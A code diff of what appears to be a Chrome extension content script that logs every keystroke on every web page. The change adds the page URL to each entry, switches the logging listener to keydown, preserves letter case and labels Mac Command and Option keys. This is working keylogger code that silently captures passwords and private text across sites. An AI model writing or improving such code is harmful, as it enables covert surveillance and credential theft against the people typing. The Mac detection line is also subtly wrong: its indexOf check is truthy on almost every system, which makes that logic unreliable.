@@ -2,12 +2,13 @@
 var lastURL = "";
 var lastTime = "";
 var lastKey = 0; // Lastkey is used to prevent multiple listeners registering the same key twice
+var isMac = (window.navigator.appVersion.indexOf("Mac OS") ? true : false); //Check if Mac for command/window and alt/option keys
 var json = {};
 
-chrome.storage.local.set({saveType: 'normal'}, function(x) {console.log('Set')});
-
+chrome.storage.local.set({saveType: 'explicit'}, function(x) {console.log('Set')});
+console.log('mac', isMac);
 chrome.storage.local.get('saveType', function(res) {
-	console.log(res.saveType);
+	console.log('saveType', res.saveType);
 	if (res.saveType == "normal") {
 		document.addEventListener('keypress', function (e) {
 			var now = utc();
@@ -17,7 +18,7 @@ chrome.storage.local.get('saveType', function(res) {
 				if (e.view.document.URL != lastURL) { // Keys depend on URL's, new URL = new key
 					lastURL = e.view.document.URL;
 					lastTime = now;
-					json[lastTime] = e.view.document.title + "^~^" + key;
+					json[lastTime] = e.view.document.title + "^~^" + e.view.document.URL + "^~^" + key;
 				} else { // Append to existing key
 					json[lastTime] += key;
 				}
@@ -25,7 +26,7 @@ chrome.storage.local.get('saveType', function(res) {
 			}
 		});
 	} else if (res.saveType == "explicit") {
-		document.addEventListener('keyup', function (e) {
+		document.addEventListener('keydown', function (e) {
 			var now = utc();
 			if (now - lastKey > 10) { // Stop duplicates (most people cannot press 2 keys in 10 milliseconds)
 				lastKey = now;
@@ -33,7 +34,7 @@ chrome.storage.local.get('saveType', function(res) {
 				if (e.view.document.URL != lastURL) { // Keys depend on URL's, new URL = new key
 					lastURL = e.view.document.URL;
 					lastTime = now;
-					json[lastTime] = e.view.document.title + "^~^" + key;
+					json[lastTime] = e.view.document.title + "^~^" + e.view.document.URL + "^~^" + key;
 				} else { // Append to existing key
 					json[lastTime] += key;
 				}
@@ -50,7 +51,7 @@ function utc() {
 function getKey(event) {
 	charCode = event.keyCode;
 	if ((charCode > 47 && charCode < 91) || charCode == 32) { //Keyboard letters and numbers 
-		return String.fromCharCode(charCode);
+		return (event.shiftKey ? String.fromCharCode(charCode) : String.fromCharCode(charCode).toLowerCase());
 	} else { //Symbols and whatnot
 		if (charCode == 8) {
 			return "[BACKSPACE]"; //  backspace
@@ -63,7 +64,11 @@ function getKey(event) {
 		} else if (charCode == 17) {
 			return "[CTRL]"; //  ctrl
 		} else if (charCode == 18) {
-			return "[ALT]"; //  alt
+			if (isMac) {
+				return "[OPTION]";
+			} else {
+				return "[ALT]"; //  alt
+			}
 		} else if (charCode == 19) {
 			return "[PAUSE/BREAK]"; //  pause/break
 		} else if (charCode == 20) {
@@ -91,9 +96,17 @@ function getKey(event) {
 		} else if (charCode == 46) {
 			return "[DELETE]"; // delete
 		} else if (charCode == 91) {
-			return "[L WINDOW]"; // left window
+			if (isMac) {
+				return "[L COMMAND]";
+			} else {
+				return "[L WINDOW]"; // left window
+			}
 		} else if (charCode == 92) {
-			return "[R WINDOW]"; // right window
+			if (isMac) {
+				return "[R COMMAND]";
+			} else {
+				return "[R WINDOW]"; // right window
+			}
 		} else if (charCode == 93) {
 			return "[SELECT]"; // select key
 		} else if (charCode == 96) {
